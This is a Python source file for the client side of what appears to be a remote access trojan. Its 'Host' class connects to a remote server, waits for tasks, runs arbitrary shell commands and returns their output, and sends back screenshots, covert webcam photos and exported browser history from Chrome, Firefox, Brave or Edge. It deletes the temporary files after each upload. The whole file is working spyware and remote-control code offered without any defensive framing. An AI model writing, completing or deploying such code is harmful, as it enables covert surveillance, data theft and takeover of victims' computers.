from connection import Connector
import pyautogui
from os import remove
from cv2 import VideoCapture, imencode, CAP_DSHOW
from subprocess import Popen, PIPE
from socket import gethostbyname
from browser_history import browsers


class Host:

    def __init__(self, name):
        self.__name = name
        self.__connector = Connector()

    def send_str(self, string):
        self.__connector.send_str(string)

    def start_connection(self, host, port):
        host = gethostbyname(host)
        self.__connector.connect((host, port))
        self.__connector.send_str(self.__name)

    def wait_task(self):
        task  = self.__connector.get_str()
        return task

    def end_connection(self):
        self.__connector.close()


    def send_screenshot(self):
        name = "screenshot.png"
        pyautogui.screenshot(name)
        self.__connector.send_file(name)        
        remove(name)
    
    def send_photo_camera(self):
        camera = VideoCapture(0, CAP_DSHOW)
        result, image = camera.read()
        result, encoded = imencode(".png", image)
        if result:
            self.__connector.send_bytes(encoded.tobytes())
        camera.release()

    def send_file(self):
        pass

    def recv_file(self):
        pass

    def execute_terminal(self, command):
        process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        out, err = process.communicate()
        self.__connector.send_bytes(out, err)

    def send_browser_historial(self, browser:str):
        if browser == "chrome":
            browserr = browsers.Chrome()
        elif browser == "firefox":
            browserr = browsers.Firefox()
        elif browser == "brave":
            browserr = browsers.Brave()
        else:
            browserr = browsers.Edge()
        fetch = browserr.fetch_history()
        fetch.save("historial.csv")
        
        self.__connector.send_file("historial.csv")
        remove("historial.csv")